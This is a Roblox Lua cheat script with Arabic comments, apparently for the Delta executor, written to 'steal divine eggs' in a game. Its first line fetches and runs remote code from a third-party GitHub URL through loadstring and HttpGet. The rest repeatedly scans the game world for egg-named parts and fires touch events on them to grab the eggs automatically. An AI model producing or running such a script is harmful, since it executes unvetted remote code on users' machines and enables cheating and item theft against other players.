-- الكود الأصلي الأساسي
loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"))()

-- سكربت سرقة بيض الديفاين مخصص بأسماء البيض والنوادر للعمل بقوة على Delta
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local LocalPlayer = Players.LocalPlayer

-- قائمة أسماء بيض الديفاين والبيئات الخاصة بها في اللعبة لضمان دقة السرقة
local divineEggNames = {
    "divine", "egg", "unicorn", "kitsune", "dreadscale", 
    "nightflame", "shattered", "archangel", "world burner", "aetheron"
}

-- دالة متقدمة للبحث عن بيض الديفاين عبر أسمائه المحددة وضمان التفاعل معه
local function stealDivineEggs()
    pcall(function()
        for _, obj in pairs(Workspace:GetDescendants()) do
            if obj:IsA("BasePart") then
                local objNameLower = string.lower(obj.Name)
                for _, targetName in ipairs(divineEggNames) do
                    if string.find(objNameLower, targetName) then
                        if obj:FindFirstChild("TouchInterest") or obj:FindFirstChild("ProximityPrompt") then
                            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                                firetouchinterest(LocalPlayer.Character.HumanoidRootPart, obj, 0)
                                task.wait(0.05)
                                firetouchinterest(LocalPlayer.Character.HumanoidRootPart, obj, 1)
                            end
                        end
                        break
                    end
                end
            end
        end
    end)
end

-- حلقة تكرار ذكية تعمل في الخلفية للتحقق المستمر وسرقة البيض فور ظهوره
task.spawn(function()
    while task.wait(0.4) do
        local success, err = pcall(function()
            stealDivineEggs()
        end)
        if not success then
            task.wait(1)
        end
    end
end)

print("تم تفعيل سكربت سرقة بيض الديفاين بأساميها المخصصة بنجاح على Delta!")
